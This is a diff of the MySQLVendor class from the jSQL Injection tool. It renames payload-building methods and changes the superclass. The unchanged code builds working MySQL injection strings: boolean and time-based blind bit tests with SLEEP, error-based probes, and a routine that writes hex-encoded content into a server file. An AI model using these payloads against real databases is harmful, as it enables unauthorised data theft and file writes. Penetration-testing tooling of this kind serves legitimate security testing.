@@ -11,7 +11,7 @@ import com.jsql.model.injection.strategy.Strategy;
 import com.jsql.model.injection.strategy.blind.ConcreteTimeInjection;
 import com.jsql.util.StringUtil;
 
-public class MySQLVendor extends AbstractVendor {
+public class MySQLVendor extends AbstractVendorDefault {
 
     @Override
     public String getSqlInfos() {
@@ -144,7 +144,7 @@ public class MySQLVendor extends AbstractVendor {
     }
 
     @Override
-    public String getSqlPrivilegeCheck() {
+    public String sqlPrivilegeTest() {
         return
             /**
              * error base convert 0x01030307 to \x01\x03\x03\x07
@@ -167,7 +167,7 @@ public class MySQLVendor extends AbstractVendor {
     }
 
     @Override
-    public String getSqlReadFile(String filePath) {
+    public String sqlFileRead(String filePath) {
         return
             /**
              * error base convert 0x01030307 to \x01\x03\x03\x07
@@ -179,11 +179,11 @@ public class MySQLVendor extends AbstractVendor {
     }
 
     @Override
-    public String getSqlTextIntoFile(String content, String filePath) {
+    public String sqlTextIntoFile(String content, String filePath) {
         return
             MediatorModel.model().getIndexesInUrl()
                 .replaceAll(
-                    "1337" + ((NormalStrategy) Strategy.NORMAL.instance()).visibleIndex + "7331",
+                    "1337" + ((NormalStrategy) Strategy.NORMAL.instance()).getVisibleIndex() + "7331",
                     "(select+0x" + StringUtil.strhex(content) + ")"
                 )
                 .replaceAll("--++", "")
@@ -201,42 +201,42 @@ public class MySQLVendor extends AbstractVendor {
     }
 
     @Override
-    public String getSqlBlindFirstTest() {
+    public String sqlTestBlindFirst() {
         return "0%2b1=1";
     }
 
     @Override
-    public String getSqlBlindCheck(String check) {
+    public String sqlTestBlind(String check) {
         return "+and+" + check + "--+";
     }
 
     @Override
-    public String getSqlBlindBitCheck(String inj, int indexCharacter, int bit) {
+    public String sqlBitTestBlind(String inj, int indexCharacter, int bit) {
         return "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
     }
 
     @Override
-    public String getSqlBlindLengthCheck(String inj, int indexCharacter) {
+    public String sqlLengthTestBlind(String inj, int indexCharacter) {
         return "+and+char_length(" + inj + ")>" + indexCharacter + "--+";
     }
 
     @Override
-    public String getSqlTimeCheck(String check) {
+    public String sqlTimeTest(String check) {
         return "+and+if(" + check + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP_TIME + "))--+";
     }
 
     @Override
-    public String getSqlTimeBitCheck(String inj, int indexCharacter, int bit) {
+    public String sqlBitTestTime(String inj, int indexCharacter, int bit) {
         return "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP_TIME + "))--+";
     }
 
     @Override
-    public String getSqlTimeLengthCheck(String inj, int indexCharacter) {
+    public String sqlLengthTestTime(String inj, int indexCharacter) {
         return "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP_TIME + "))--+";
     }
 
     @Override
-    public String getSqlBlind(String sqlQuery, String startPosition) {
+    public String sqlBlind(String sqlQuery, String startPosition) {
         return
             "(" +
                 "select+" +
@@ -252,7 +252,7 @@ public class MySQLVendor extends AbstractVendor {
     }
 
     @Override
-    public String getSqlTime(String sqlQuery, String startPosition) {
+    public String sqlTime(String sqlQuery, String startPosition) {
         return
             "(" +
                 "select+" +
@@ -268,7 +268,7 @@ public class MySQLVendor extends AbstractVendor {
     }
 
     @Override
-    public String getSqlErrorBasedCheck() {
+    public String sqlTestErrorBased() {
         return
             "+and(" +
                 "select+1+" +
@@ -284,7 +284,7 @@ public class MySQLVendor extends AbstractVendor {
     }
 
     @Override
-    public String getSqlErrorBased(String sqlQuery, String startPosition) {
+    public String sqlErrorBased(String sqlQuery, String startPosition) {
         return
             "+and" +
                 "(" +
